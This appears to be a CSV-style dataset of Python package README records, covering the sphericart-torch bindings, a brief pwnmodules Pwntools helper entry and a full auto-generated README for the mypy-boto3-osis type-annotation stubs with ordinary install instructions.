sphericart-torch,https://github.com/lab-cosmo/sphericart,0,213,213,"# TorchScript bindings to sphericart

This package contains the TorchScript-compatible version of sphericart. See the
[sphericart documentation](https://sphericart.readthedocs.io/en/latest/) for
more information.
","# TorchScript bindings to sphericart

This package contains the TorchScript-compatible version of sphericart. See the
[sphericart documentation](https://sphericart.readthedocs.io/en/latest/) for
more information.
",lab-cosmo/sphericart
pwnmodules,https://github.com/XKaguya/PwnModules,1,86,86,"A open-source Pwntools Extern Functions.
Usage:
```
from PwnModules import *
```
","A open-source Pwntools Extern Functions.
Usage:
```
from PwnModules import *
```
",xkaguya/pwnmodules
mypy-boto3-osis,https://github.com/youtype/mypy_boto3_builder,1,11760,11119,"<a id=""mypy-boto3-osis""></a>

# mypy-boto3-osis

[![PyPI - mypy-boto3-osis](https://img.shields.io/pypi/v/mypy-boto3-osis.svg?color=blue)](https://pypi.org/project/mypy-boto3-osis)
[![PyPI - Python Version](https://img.shields.io/pypi/pyversions/mypy-boto3-osis.svg?color=blue)](https://pypi.org/project/mypy-boto3-osis)
[![Docs](https://img.shields.io/readthedocs/boto3-stubs.svg?color=blue)](https://youtype.github.io/boto3_stubs_docs/mypy_boto3_osis/)
[![PyPI - Downloads](https://img.shields.io/pypi/dm/mypy-boto3-osis?color=blue)](https://pypistats.org/packages/mypy-boto3-osis)

![boto3.typed](https://github.com/youtype/mypy_boto3_builder/raw/main/logo.png)

Type annotations for
[boto3.OpenSearchIngestion 1.26.122](https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/osis.html#OpenSearchIngestion)
service compatible with [VSCode](https://code.visualstudio.com/),
[PyCharm](https://www.jetbrains.com/pycharm/),
[Emacs](https://www.gnu.org/software/emacs/),
[Sublime Text](https://www.sublimetext.com/),
[mypy](https://github.com/python/mypy),
[pyright](https://github.com/microsoft/pyright) and other tools.

Generated by
[mypy-boto3-builder 7.14.5](https://github.com/youtype/mypy_boto3_builder).

More information can be found on
[boto3-stubs](https://pypi.org/project/boto3-stubs/) page and in
[mypy-boto3-osis docs](https://youtype.github.io/boto3_stubs_docs/mypy_boto3_osis/).

See how it helps to find and fix potential bugs:

![boto3-stubs demo](https://github.com/youtype/mypy_boto3_builder/raw/main/demo.gif)

- [mypy-boto3-osis](#mypy-boto3-osis)
  - [How to install](#how-to-install)
    - [VSCode extension](#vscode-extension)
    - [From PyPI with pip](#from-pypi-with-pip)
  - [How to uninstall](#how-to-uninstall)
  - [Usage](#usage)
    - [VSCode](#vscode)
    - [PyCharm](#pycharm)
    - [Emacs](#emacs)
    - [Sublime Text](#sublime-text)
    - [Other IDEs](#other-ides)
    - [mypy](#mypy)
    - [pyright](#pyright)
  - [Explicit type annotations](#explicit-type-annotations)
    - [Client annotations](#client-annotations)
    - [Literals](#literals)
    - [Typed dictionaries](#typed-dictionaries)
  - [How it works](#how-it-works)
  - [What's new](#what's-new)
    - [Implemented features](#implemented-features)
    - [Latest changes](#latest-changes)
  - [Versioning](#versioning)
  - [Thank you](#thank-you)
  - [Documentation](#documentation)
  - [Support and contributing](#support-and-contributing)

<a id=""how-to-install""></a>

## How to install

<a id=""vscode-extension""></a>

### VSCode extension

Add
[AWS Boto3](https://marketplace.visualstudio.com/items?itemName=Boto3typed.boto3-ide)
extension to your VSCode and run `AWS boto3: Quick Start` command.

Click `Modify` and select `boto3 common` and `OpenSearchIngestion`.

<a id=""from-pypi-with-pip""></a>

### From PyPI with pip

Install `boto3-stubs` for `OpenSearchIngestion` service.

```bash
# install with boto3 type annotations
python -m pip install 'boto3-stubs[osis]'


# Lite version does not provide session.client/resource overloads
# it is more RAM-friendly, but requires explicit type annotations
python -m pip install 'boto3-stubs-lite[osis]'


# standalone installation
python -m pip install mypy-boto3-osis
```

<a id=""how-to-uninstall""></a>

## How to uninstall

```bash
python -m pip uninstall -y mypy-boto3-osis
```

<a id=""usage""></a>

## Usage

<a id=""vscode""></a>

### VSCode

- Install
  [Python extension](https://marketplace.visualstudio.com/items?itemName=ms-python.python)
- Install
  [Pylance extension](https://marketplace.visualstudio.com/items?itemName=ms-python.vscode-pylance)
- Set `Pylance` as your Python Language Server
- Install `boto3-stubs[osis]` in your environment:

```bash
python -m pip install 'boto3-stubs[osis]'
```

Both type checking and code completion should now work. No explicit type
annotations required, write your `boto3` code as usual.

<a id=""pycharm""></a>

### PyCharm

Install `boto3-stubs-lite[osis]` in your environment:

```bash
python -m pip install 'boto3-stubs-lite[osis]'`
```

Both type checking and code completion should now work. Explicit type
annotations **are required**.

Use `boto3-stubs` package instead for implicit type discovery.

<a id=""emacs""></a>

### Emacs

- Install `boto3-stubs` with services you use in your environment:

```bash
python -m pip install 'boto3-stubs[osis]'
```

- Install [use-package](https://github.com/jwiegley/use-package),
  [lsp](https://github.com/emacs-lsp/lsp-mode/),
  [company](https://github.com/company-mode/company-mode) and
  [flycheck](https://github.com/flycheck/flycheck) packages
- Install [lsp-pyright](https://github.com/emacs-lsp/lsp-pyright) package

```elisp
(use-package lsp-pyright
  :ensure t
  :hook (python-mode . (lambda ()
                          (require 'lsp-pyright)
                          (lsp)))  ; or lsp-deferred
  :init (when (executable-find ""python3"")
          (setq lsp-pyright-python-executable-cmd ""python3""))
  )
```

- Make sure emacs uses the environment where you have installed `boto3-stubs`

Type checking should now work. No explicit type annotations required, write
your `boto3` code as usual.

<a id=""sublime-text""></a>

### Sublime Text

- Install `boto3-stubs[osis]` with services you use in your environment:

```bash
python -m pip install 'boto3-stubs[osis]'
```

- Install [LSP-pyright](https://github.com/sublimelsp/LSP-pyright) package

Type checking should now work. No explicit type annotations required, write
your `boto3` code as usual.

<a id=""other-ides""></a>

### Other IDEs

Not tested, but as long as your IDE supports `mypy` or `pyright`, everything
should work.

<a id=""mypy""></a>

### mypy

- Install `mypy`: `python -m pip install mypy`
- Install `boto3-stubs[osis]` in your environment:

```bash
python -m pip install 'boto3-stubs[osis]'`
```

Type checking should now work. No explicit type annotations required, write
your `boto3` code as usual.

<a id=""pyright""></a>

### pyright

- Install `pyright`: `npm i -g pyright`
- Install `boto3-stubs[osis]` in your environment:

```bash
python -m pip install 'boto3-stubs[osis]'
```

Optionally, you can install `boto3-stubs` to `typings` folder.

Type checking should now work. No explicit type annotations required, write
your `boto3` code as usual.

<a id=""explicit-type-annotations""></a>

## Explicit type annotations

<a id=""client-annotations""></a>

### Client annotations

`OpenSearchIngestionClient` provides annotations for `boto3.client(""osis"")`.

```python
from boto3.session import Session

from mypy_boto3_osis import OpenSearchIngestionClient

client: OpenSearchIngestionClient = Session().client(""osis"")

# now client usage is checked by mypy and IDE should provide code completion
```

<a id=""literals""></a>

### Literals

`mypy_boto3_osis.literals` module contains literals extracted from shapes that
can be used in user code for type checking.

```python
from mypy_boto3_osis.literals import (
    ChangeProgressStageStatusesType,
    ChangeProgressStatusesType,
    PipelineStatusType,
    OpenSearchIngestionServiceName,
    ServiceName,
    ResourceServiceName,
    RegionName,
)


def check_value(value: ChangeProgressStageStatusesType) -> bool:
    ...
```

<a id=""typed-dictionaries""></a>

### Typed dictionaries

`mypy_boto3_osis.type_defs` module contains structures and shapes assembled to
typed dictionaries for additional type checking.

```python
from mypy_boto3_osis.type_defs import (
    ChangeProgressStageTypeDef,
    CloudWatchLogDestinationTypeDef,
    TagTypeDef,
    VpcOptionsTypeDef,
    ResponseMetadataTypeDef,
    DeletePipelineRequestRequestTypeDef,
    GetPipelineBlueprintRequestRequestTypeDef,
    PipelineBlueprintTypeDef,
    GetPipelineChangeProgressRequestRequestTypeDef,
    GetPipelineRequestRequestTypeDef,
    PipelineBlueprintSummaryTypeDef,
    ListPipelinesRequestRequestTypeDef,
    ListTagsForResourceRequestRequestTypeDef,
    PipelineStatusReasonTypeDef,
    StartPipelineRequestRequestTypeDef,
    StopPipelineRequestRequestTypeDef,
    UntagResourceRequestRequestTypeDef,
    ValidatePipelineRequestRequestTypeDef,
    ValidationMessageTypeDef,
    ChangeProgressStatusTypeDef,
    LogPublishingOptionsTypeDef,
    TagResourceRequestRequestTypeDef,
    VpcEndpointTypeDef,
    ListTagsForResourceResponseTypeDef,
    GetPipelineBlueprintResponseTypeDef,
    ListPipelineBlueprintsResponseTypeDef,
    PipelineSummaryTypeDef,
    ValidatePipelineResponseTypeDef,
    GetPipelineChangeProgressResponseTypeDef,
    CreatePipelineRequestRequestTypeDef,
    UpdatePipelineRequestRequestTypeDef,
    PipelineTypeDef,
    ListPipelinesResponseTypeDef,
    CreatePipelineResponseTypeDef,
    GetPipelineResponseTypeDef,
    StartPipelineResponseTypeDef,
    StopPipelineResponseTypeDef,
    UpdatePipelineResponseTypeDef,
)


def get_structure() -> ChangeProgressStageTypeDef:
    return {...}
```

<a id=""how-it-works""></a>

## How it works

Fully automated
[mypy-boto3-builder](https://github.com/youtype/mypy_boto3_builder) carefully
generates type annotations for each service, patiently waiting for `boto3`
updates. It delivers drop-in type annotations for you and makes sure that:

- All available `boto3` services are covered.
- Each public class and method of every `boto3` service gets valid type
  annotations extracted from `botocore` schemas.
- Type annotations include up-to-date documentation.
- Link to documentation is provided for every method.
- Code is processed by [black](https://github.com/psf/black) and
  [isort](https://github.com/PyCQA/isort) for readability.

<a id=""what's-new""></a>

## What's new

<a id=""implemented-features""></a>

### Implemented features

- Fully type annotated `boto3`, `botocore`, `aiobotocore` and `aioboto3`
  libraries
- `mypy`, `pyright`, `VSCode`, `PyCharm`, `Sublime Text` and `Emacs`
  compatibility
- `Client`, `ServiceResource`, `Resource`, `Waiter` `Paginator` type
  annotations for each service
- Generated `TypeDefs` for each service
- Generated `Literals` for each service
- Auto discovery of types for `boto3.client` and `boto3.resource` calls
- Auto discovery of types for `session.client` and `session.resource` calls
- Auto discovery of types for `client.get_waiter` and `client.get_paginator`
  calls
- Auto discovery of types for `ServiceResource` and `Resource` collections
- Auto discovery of types for `aiobotocore.Session.create_client` calls

<a id=""latest-changes""></a>

### Latest changes

Builder changelog can be found in
[Releases](https://github.com/youtype/mypy_boto3_builder/releases).

<a id=""versioning""></a>

## Versioning

`mypy-boto3-osis` version is the same as related `boto3` version and follows
[PEP 440](https://www.python.org/dev/peps/pep-0440/) format.

<a id=""thank-you""></a>

## Thank you

- [Allie Fitter](https://github.com/alliefitter) for
  [boto3-type-annotations](https://pypi.org/project/boto3-type-annotations/),
  this package is based on top of his work
- [black](https://github.com/psf/black) developers for an awesome formatting
  tool
- [Timothy Edmund Crosley](https://github.com/timothycrosley) for
  [isort](https://github.com/PyCQA/isort) and how flexible it is
- [mypy](https://github.com/python/mypy) developers for doing all dirty work
  for us
- [pyright](https://github.com/microsoft/pyright) team for the new era of typed
  Python

<a id=""documentation""></a>

## Documentation

All services type annotations can be found in
[boto3 docs](https://youtype.github.io/boto3_stubs_docs/mypy_boto3_osis/)

<a id=""support-and-contributing""></a>

## Support and contributing

This package is auto-generated. Please reports any bugs or request new features
in [mypy-boto3-builder](https://github.com/youtype/mypy_boto3_builder/issues/)
repository.
","

# mypy-boto3-osis

[![PyPI - mypy-boto3-osis](https://img.shields.io/pypi/v/mypy-boto3-osis.svg?color=blue)](https://pypi.org/project/mypy-boto3-osis)
[![PyPI - Python Version](https://img.shields.io/pypi/pyversions/mypy-boto3-osis.svg?color=blue)](https://pypi.org/project/mypy-boto3-osis)
[![Docs](https://img.shields.io/readthedocs/boto3-stubs.svg?color=blue)](https://youtype.github.io/boto3_stubs_docs/mypy_boto3_osis/)
[![PyPI - Downloads](https://img.shields.io/pypi/dm/mypy-boto3-osis?color=blue)](https://pypistats.org/packages/mypy-boto3-osis)

![boto3.typed](https://github.com/youtype/mypy_boto3_builder/raw/main/logo.png)

Type annotations for
[boto3.OpenSearchIngestion 1.26.122](https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/osis.html#OpenSearchIngestion)
service compatible with [VSCode](https://code.visualstudio.com/),
[PyCharm](https://www.jetbrains.com/pycharm/),
[Emacs](https://www.gnu.org/software/emacs/),
[Sublime Text](https://www.sublimetext.com/),
[mypy](https://github.com/python/mypy),
[pyright](https://github.com/microsoft/pyright) and other tools.

Generated by
[mypy-boto3-builder 7.14.5](https://github.com/youtype/mypy_boto3_builder).

More information can be found on
[boto3-stubs](https://pypi.org/project/boto3-stubs/) page and in
[mypy-boto3-osis docs](https://youtype.github.io/boto3_stubs_docs/mypy_boto3_osis/).

See how it helps to find and fix potential bugs:

![boto3-stubs demo](https://github.com/youtype/mypy_boto3_builder/raw/main/demo.gif)

- [mypy-boto3-osis](#mypy-boto3-osis)
  - [How to install](#how-to-install)
    - [VSCode extension](#vscode-extension)
    - [From PyPI with pip](#from-pypi-with-pip)
  - [How to uninstall](#how-to-uninstall)
  - [Usage](#usage)
    - [VSCode](#vscode)
    - [PyCharm](#pycharm)
    - [Emacs](#emacs)
    - [Sublime Text](#sublime-text)
    - [Other IDEs](#other-ides)
    - [mypy](#mypy)
    - [pyright](#pyright)
  - [Explicit type annotations](#explicit-type-annotations)
    - [Client annotations](#client-annotations)
    - [Literals](#literals)
    - [Typed dictionaries](#typed-dictionaries)
  - [How it works](#how-it-works)
  - [What's new](#what's-new)
    - [Implemented features](#implemented-features)
    - [Latest changes](#latest-changes)
  - [Versioning](#versioning)
  - [Thank you](#thank-you)
  - [Documentation](#documentation)
  - [Support and contributing](#support-and-contributing)



## How to install



### VSCode extension

Add
[AWS Boto3](https://marketplace.visualstudio.com/items?itemName=Boto3typed.boto3-ide)
extension to your VSCode and run `AWS boto3: Quick Start` command.

Click `Modify` and select `boto3 common` and `OpenSearchIngestion`.



### From PyPI with pip

Install `boto3-stubs` for `OpenSearchIngestion` service.

```bash
# install with boto3 type annotations
python -m pip install 'boto3-stubs[osis]'


# Lite version does not provide session.client/resource overloads
# it is more RAM-friendly, but requires explicit type annotations
python -m pip install 'boto3-stubs-lite[osis]'


# standalone installation
python -m pip install mypy-boto3-osis
```



## How to uninstall

```bash
python -m pip uninstall -y mypy-boto3-osis
```



## Usage



### VSCode

- Install
  [Python extension](https://marketplace.visualstudio.com/items?itemName=ms-python.python)
- Install
  [Pylance extension](https://marketplace.visualstudio.com/items?itemName=ms-python.vscode-pylance)
- Set `Pylance` as your Python Language Server
- Install `boto3-stubs[osis]` in your environment:

```bash
python -m pip install 'boto3-stubs[osis]'
```

Both type checking and code completion should now work. No explicit type
annotations required, write your `boto3` code as usual.



### PyCharm

Install `boto3-stubs-lite[osis]` in your environment:

```bash
python -m pip install 'boto3-stubs-lite[osis]'`
```

Both type checking and code completion should now work. Explicit type
annotations **are required**.

Use `boto3-stubs` package instead for implicit type discovery.



### Emacs

- Install `boto3-stubs` with services you use in your environment:

```bash
python -m pip install 'boto3-stubs[osis]'
```

- Install [use-package](https://github.com/jwiegley/use-package),
  [lsp](https://github.com/emacs-lsp/lsp-mode/),
  [company](https://github.com/company-mode/company-mode) and
  [flycheck](https://github.com/flycheck/flycheck) packages
- Install [lsp-pyright](https://github.com/emacs-lsp/lsp-pyright) package

```elisp
(use-package lsp-pyright
  :ensure t
  :hook (python-mode . (lambda ()
                          (require 'lsp-pyright)
                          (lsp)))  ; or lsp-deferred
  :init (when (executable-find ""python3"")
          (setq lsp-pyright-python-executable-cmd ""python3""))
  )
```

- Make sure emacs uses the environment where you have installed `boto3-stubs`

Type checking should now work. No explicit type annotations required, write
your `boto3` code as usual.



### Sublime Text

- Install `boto3-stubs[osis]` with services you use in your environment:

```bash
python -m pip install 'boto3-stubs[osis]'
```

- Install [LSP-pyright](https://github.com/sublimelsp/LSP-pyright) package

Type checking should now work. No explicit type annotations required, write
your `boto3` code as usual.



### Other IDEs

Not tested, but as long as your IDE supports `mypy` or `pyright`, everything
should work.



### mypy

- Install `mypy`: `python -m pip install mypy`
- Install `boto3-stubs[osis]` in your environment:

```bash
python -m pip install 'boto3-stubs[osis]'`
```

Type checking should now work. No explicit type annotations required, write
your `boto3` code as usual.



### pyright

- Install `pyright`: `npm i -g pyright`
- Install `boto3-stubs[osis]` in your environment:

```bash
python -m pip install 'boto3-stubs[osis]'
```

Optionally, you can install `boto3-stubs` to `typings` folder.

Type checking should now work. No explicit type annotations required, write
your `boto3` code as usual.



## Explicit type annotations



### Client annotations

`OpenSearchIngestionClient` provides annotations for `boto3.client(""osis"")`.

```python
from boto3.session import Session

from mypy_boto3_osis import OpenSearchIngestionClient

client: OpenSearchIngestionClient = Session().client(""osis"")

# now client usage is checked by mypy and IDE should provide code completion
```



### Literals

`mypy_boto3_osis.literals` module contains literals extracted from shapes that
can be used in user code for type checking.

```python
from mypy_boto3_osis.literals import (
    ChangeProgressStageStatusesType,
    ChangeProgressStatusesType,
    PipelineStatusType,
    OpenSearchIngestionServiceName,
    ServiceName,
    ResourceServiceName,
    RegionName,
)


def check_value(value: ChangeProgressStageStatusesType) -> bool:
    ...
```



### Typed dictionaries

`mypy_boto3_osis.type_defs` module contains structures and shapes assembled to
typed dictionaries for additional type checking.

```python
from mypy_boto3_osis.type_defs import (
    ChangeProgressStageTypeDef,
    CloudWatchLogDestinationTypeDef,
    TagTypeDef,
    VpcOptionsTypeDef,
    ResponseMetadataTypeDef,
    DeletePipelineRequestRequestTypeDef,
    GetPipelineBlueprintRequestRequestTypeDef,
    PipelineBlueprintTypeDef,
    GetPipelineChangeProgressRequestRequestTypeDef,
    GetPipelineRequestRequestTypeDef,
    PipelineBlueprintSummaryTypeDef,
    ListPipelinesRequestRequestTypeDef,
    ListTagsForResourceRequestRequestTypeDef,
    PipelineStatusReasonTypeDef,
    StartPipelineRequestRequestTypeDef,
    StopPipelineRequestRequestTypeDef,
    UntagResourceRequestRequestTypeDef,
    ValidatePipelineRequestRequestTypeDef,
    ValidationMessageTypeDef,
    ChangeProgressStatusTypeDef,
    LogPublishingOptionsTypeDef,
    TagResourceRequestRequestTypeDef,
    VpcEndpointTypeDef,
    ListTagsForResourceResponseTypeDef,
    GetPipelineBlueprintResponseTypeDef,
    ListPipelineBlueprintsResponseTypeDef,
    PipelineSummaryTypeDef,
    ValidatePipelineResponseTypeDef,
    GetPipelineChangeProgressResponseTypeDef,
    CreatePipelineRequestRequestTypeDef,
    UpdatePipelineRequestRequestTypeDef,
    PipelineTypeDef,
    ListPipelinesResponseTypeDef,
    CreatePipelineResponseTypeDef,
    GetPipelineResponseTypeDef,
    StartPipelineResponseTypeDef,
    StopPipelineResponseTypeDef,
    UpdatePipelineResponseTypeDef,
)


def get_structure() -> ChangeProgressStageTypeDef:
    return {...}
```



## How it works

Fully automated
[mypy-boto3-builder](https://github.com/youtype/mypy_boto3_builder) carefully
generates type annotations for each service, patiently waiting for `boto3`
updates. It delivers drop-in type annotations for you and makes sure that:

- All available `boto3` services are covered.
- Each public class and method of every `boto3` service gets valid type
  annotations extracted from `botocore` schemas.
- Type annotations include up-to-date documentation.
- Link to documentation is provided for every method.
- Code is processed by [black](https://github.com/psf/black) and
  [isort](https://github.com/PyCQA/isort) for readability.



## What's new



### Implemented features

- Fully type annotated `boto3`, `botocore`, `aiobotocore` and `aioboto3`
  libraries
- `mypy`, `pyright`, `VSCode`, `PyCharm`, `Sublime Text` and `Emacs`
  compatibility
- `Client`, `ServiceResource`, `Resource`, `Waiter` `Paginator` type
  annotations for each service
- Generated `TypeDefs` for each service
- Generated `Literals` for each service
- Auto discovery of types for `boto3.client` and `boto3.resource` calls
- Auto discovery of types for `session.client` and `session.resource` calls
- Auto discovery of types for `client.get_waiter` and `client.get_paginator`
  calls
- Auto discovery of types for `ServiceResource` and `Resource` collections
- Auto discovery of types for `aiobotocore.Session.create_client` calls



### Latest changes

Builder changelog can be found in
[Releases](https://github.com/youtype/mypy_boto3_builder/releases).



## Versioning

`mypy-boto3-osis` version is the same as related `boto3` version and follows
[PEP 440](https://www.python.org/dev/peps/pep-0440/) format.



## Thank you

- [Allie Fitter](https://github.com/alliefitter) for
  [boto3-type-annotations](https://pypi.org/project/boto3-type-annotations/),
  this package is based on top of his work
- [black](https://github.com/psf/black) developers for an awesome formatting
  tool
- [Timothy Edmund Crosley](https://github.com/timothycrosley) for
  [isort](https://github.com/PyCQA/isort) and how flexible it is
- [mypy](https://github.com/python/mypy) developers for doing all dirty work
  for us
- [pyright](https://github.com/microsoft/pyright) team for the new era of typed
  Python



## Documentation

All services type annotations can be found in
[boto3 docs](https://youtype.github.io/boto3_stubs_docs/mypy_boto3_osis/)



## Support and contributing

This package is auto-generated. Please reports any bugs or request new features
in [mypy-boto3-builder](https://github.com/youtype/mypy_boto3_builder/issues/)
repository.
",youtype/mypy_boto3_builder
